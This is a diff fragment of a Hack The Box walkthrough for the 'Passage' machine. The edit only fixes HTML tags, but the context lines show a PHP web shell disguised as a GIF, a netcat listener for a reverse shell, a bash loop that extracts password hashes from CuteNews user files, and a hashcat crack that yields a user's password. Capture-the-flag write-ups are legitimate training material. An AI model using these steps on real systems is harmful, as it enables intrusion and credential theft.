@@ -17,7 +17,7 @@ This machine is currently active, and is my first attempt at HTB.  Its IP addres
 <pre><code>
 GIF8;
 <?php system($_REQUEST['cmd']) ?>
-</pre></code>
+</code></pre>
 </li>
 	<li>Go to <code>http://passage:80/CuteNews/uploads/</code>, and click on your recently uploaded PHP file;</li>
 	<li>Run <code>nc -nlvp 1234</code> in a terminal window;</li>
@@ -27,7 +27,7 @@ GIF8;
 	<li>Now that you have access, you need some passwords.  There are some hashed passwords, encoded using <code>base64</code>, in the <code>/var/www/html/CuteNews/cdata/users/</code> directory.  You will need to get each of their hashes where possible: you can do some *quick and dirty* bash parsing to get the usernames and hashes:
 <pre><code>
 for i in /var/www/html/CuteNews/cdata/users/*.php; do DECODED="$(tail -n 1 "$i" | base64 -d 2>/dev/null)"; RET_VAL=$?; if [ $RET_VAL -eq 0 ]; then HASH="$(echo "$DECODED" | awk -F'64:' '{print $2}' | awk -F';' '{print $1}' | tr -d '"' | sed '/^$/d')"; if [[ ! -z "${HASH}" ]]; then NAME="$(echo "$DECODED" | awk -F'"email"' '{print $2}' | awk -F'@' '{print $1}' | awk -F'"' '{print $2}' | tr -d '"' | sed '/^$/d')"; echo -e "${NAME}\n${HASH}\n"; fi; fi; done
-</pre></code>
+</code></pre>
 You could also parse the <code>/var/www/html/CuteNews/cdata/users/lines</code> file using <code>while read</code>, as I think that has the same content;</li>
 	<li>You will now need to choose a hash and decode it.  For me, <code>paul</code>'s hash worked.  I checked <code>hash-identify</code> to see that it was likely <code>SHA-256</code>, and thus ran <code>hashcat -a 0 -m 1400 "$OUR_HASH" /usr/share/wordlists/rockyou.txt && hashcat --show -m 1400 "$OUR_HASH"</code>: we see the password is <code>atlanta1</code>.  (Thank you, Paul, for having a terrible password);</li>
 	<li>Login as Paul; <code>su paul</code>&mdash;using the password we found above.  Capture an intermediate flag: <code>cat ~/user.txt</code>;</li>
